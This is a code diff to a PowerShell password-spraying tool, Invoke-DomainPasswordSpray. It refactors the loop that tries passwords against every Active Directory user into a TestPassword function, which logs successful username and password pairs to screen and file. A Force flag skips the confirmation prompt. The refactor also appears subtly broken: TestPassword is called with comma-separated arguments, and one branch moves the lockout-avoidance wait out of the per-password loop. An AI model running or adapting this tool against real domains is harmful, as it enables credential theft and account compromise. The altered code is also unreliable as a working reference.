@@ -134,6 +134,34 @@ function Invoke-DomainPasswordSpray{
     
     }
 
+    function TestPassword($CurrentDomain, $UserListArray, $Password)
+    {
+        $time = Get-Date
+        Write-Host -ForegroundColor Yellow "[*] Password spraying has begun. Current time is $($time.ToShortTimeString())"
+        Write-Host "[*] This might take a while depending on the total number of users"
+        $curr_user = 0
+        $count = $UserListArray.count
+
+        ForEach($User in $UserListArray){
+            $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$User,$Password)
+            If ($Domain_check.name -ne $null)
+            {
+                if ($OutFile -ne "")
+                {    
+                    Add-Content $OutFile $User`:$Password
+                }
+                Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password"
+            }
+            $curr_user+=1 
+            Write-Host -nonewline "$curr_user of $count users tested`r"
+        }
+        Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
+        if ($OutFile -ne "")
+        {
+            Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
+        }
+    }
+
     # If a single password is selected do this
     if ($Password)
     {
@@ -157,30 +185,7 @@ function Invoke-DomainPasswordSpray{
             {
                 0 
                 {
-                    $time = Get-Date
-                    Write-Host -ForegroundColor Yellow "[*] Password spraying has begun. Current time is $($time.ToShortTimeString())"
-                    Write-Host "[*] This might take a while depending on the total number of users"
-                    $curr_user = 0
-                    $count = $UserListArray.count
-
-                    ForEach($User in $UserListArray){
-                    $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$User,$Password)
-                        If ($Domain_check.name -ne $null)
-                        {
-                            if ($OutFile -ne "")
-                            {    
-                                Add-Content $OutFile $User`:$Password
-                            }
-                        Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password"
-                        }
-                        $curr_user+=1 
-                        Write-Host -nonewline "$curr_user of $count users tested`r"
-                        }
-                    Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
-                    if ($OutFile -ne "")
-                    {
-                    Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
-                    }
+                    TestPassword($CurrentDomain, $UserListArray, $Password)
                 
                 }
                 1 {"Cancelling the password spray."}
@@ -189,30 +194,7 @@ function Invoke-DomainPasswordSpray{
         #If the force flag is set don't bother asking if we are sure we want to spray.
         if ($Force)
         {
-        $time = Get-Date
-        Write-Host -ForegroundColor Yellow "[*] Password spraying has begun. Current time is $($time.ToShortTimeString())"
-        Write-Host "[*] This might take a while depending on the total number of users"
-        $curr_user = 0
-        $count = $UserListArray.count
-
-        ForEach($User in $UserListArray){
-        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$User,$Password)
-            If ($Domain_check.name -ne $null)
-            {
-                if ($OutFile -ne "")
-                {    
-                    Add-Content $OutFile $User`:$Password
-                }
-            Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password"
-            }
-            $curr_user+=1 
-            Write-Host -nonewline "$curr_user of $count users tested`r"
-            }
-        Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
-        if ($OutFile -ne "")
-        {
-        Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
-        }
+            TestPassword($CurrentDomain, $UserListArray, $Password)
         }
 
 
@@ -250,74 +232,44 @@ function Invoke-DomainPasswordSpray{
         $result = $host.ui.PromptForChoice($title, $message, $options, 0) 
 
         switch ($result)
+        {
+            0 
             {
-                0 
-                {
                 Write-Host -ForegroundColor Yellow "[*] Password spraying has begun."
                 Write-Host "[*] This might take a while depending on the total number of users"
 
-                ForEach($Password_Item in $Passwords){
-                $time = Get-Date
-                Write-Host "[*] Now trying password $Password_Item. Current time is $($time.ToShortTimeString())"
-                $curr_user = 0
-                $count = $UserListArray.count
-
-                ForEach($User in $UserListArray){
-                $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$User,$Password_Item)
-                If ($Domain_check.name -ne $null)
+                ForEach($Password_Item in $Passwords)
                 {
-                    if ($OutFile -ne "")
-                    {
-                    Add-Content $OutFile $User`:$Password_Item
-                    }
-                Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password_Item"
-                }
-                $curr_user+=1 
-                Write-Host -nonewline "$curr_user of $count users tested`r"
+                    $time = Get-Date
+                    Write-Host "[*] Now trying password $Password_Item. Current time is $($time.ToShortTimeString())"
+                    TestPassword($CurrentDomain, $UserListArray, $Password_Item)
                 }
                 Countdown-Timer -Seconds (60*$observation_window)
-            }
-            Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
-            if ($OutFile -ne "")
-            {
-            Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
-            }
-                
+            
+                Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
+                if ($OutFile -ne "")
+                {
+                    Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
                 }
-                1 {"Cancelling the password spray."}
             }
+            1 {"Cancelling the password spray."}
         }
         #if the force flag is set we will not bother asking about proceeding with password spray.
         if($Force)
         {
-                Write-Host -ForegroundColor Yellow "[*] Password spraying has begun."
-                Write-Host "[*] This might take a while depending on the total number of users"
+            Write-Host -ForegroundColor Yellow "[*] Password spraying has begun."
+            Write-Host "[*] This might take a while depending on the total number of users"
 
-                ForEach($Password_Item in $Passwords){
+            ForEach($Password_Item in $Passwords){
                 $time = Get-Date
                 Write-Host "[*] Now trying password $Password_Item. Current time is $($time.ToShortTimeString())"
-                $curr_user = 0
-                $count = $UserListArray.count
-
-                ForEach($User in $UserListArray){
-                $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$User,$Password_Item)
-                If ($Domain_check.name -ne $null)
-                {
-                    if ($OutFile -ne "")
-                    {
-                    Add-Content $OutFile $User`:$Password_Item
-                    }
-                Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password_Item"
-                }
-                $curr_user+=1 
-                Write-Host -nonewline "$curr_user of $count users tested`r"
-                }
+                TestPassword($CurrentDomain, $UserListArray, $Password_Item)
                 Countdown-Timer -Seconds (60*$observation_window)
             }
             Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
             if ($OutFile -ne "")
             {
-            Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
+                Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
             }
                 
         }
